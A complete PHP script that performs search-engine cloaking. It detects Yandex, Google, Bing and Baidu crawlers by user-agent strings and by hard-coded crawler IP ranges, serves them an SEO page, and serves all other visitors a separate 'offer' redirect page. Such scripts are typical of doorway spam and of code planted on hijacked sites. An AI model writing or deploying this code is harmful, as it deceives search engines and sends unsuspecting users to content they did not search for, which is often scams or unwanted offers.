<?php
$seoPage   = __DIR__ . '/index.html';
$offerPage = __DIR__ . '/redirect.html';

function rt_ua() { return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''; }
function rt_ref() { return isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; }

function rt_ip() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
}

function isSearchBotUA() {
    $ua = rt_ua();
    $b = array('YandexBot','YandexScreenshot','YandexImages','YandexVideo','YandexMobileBot','YandexAccessibilityBot','Googlebot','Bingbot','Baiduspider');
    foreach($b as $x) { if(stripos($ua, $x) !== false) return true; }
    return false;
}

function ipInRange($ip, $cidr) {
    $parts = explode('/', $cidr);
    $subnet = $parts[0];
    $bits = isset($parts[1]) ? (int)$parts[1] : null;
    $ipBin = inet_pton($ip);
    $subnetBin = inet_pton($subnet);
    if ($ipBin === false || $subnetBin === false || strlen($ipBin) !== strlen($subnetBin)) return false;
    if ($bits === null) return $ipBin === $subnetBin;
    $ipBits = '';
    foreach (str_split($ipBin) as $char) $ipBits .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    $subnetBits = '';
    foreach (str_split($subnetBin) as $char) $subnetBits .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    return substr($ipBits, 0, $bits) === substr($subnetBits, 0, $bits);
}

function isBotIP($ip) {
    $networks = array(
        '5.45.192.0/18','5.255.192.0/18','37.9.64.0/18','37.140.128.0/18','77.88.0.0/18','84.252.160.0/19','87.250.224.0/19','93.158.128.0/18','95.108.128.0/17','141.8.128.0/18','178.154.128.0/18','213.180.192.0/19',
        '2a02:6b8::/29', // Yandex IPv6
        '66.249.64.0/19','72.14.192.0/18','74.125.0.0/16','108.177.0.0/17','142.250.0.0/15','172.217.0.0/16'
    );
    foreach($networks as $net) { if(ipInRange($ip, $net)) return true; }
    return false;
}

$user_ip = rt_ip();
$showSeo = false;

if (isSearchBotUA() || isBotIP($user_ip)) {
    $showSeo = true;
}

if ($showSeo && file_exists($seoPage)) {
    header('Content-Type: text/html; charset=utf-8');
    readfile($seoPage);
    exit;
}

if (file_exists($offerPage)) {
    header('Content-Type: text/html; charset=utf-8');
    readfile($offerPage);
    exit;
}

http_response_code(404);
echo 'Not found';
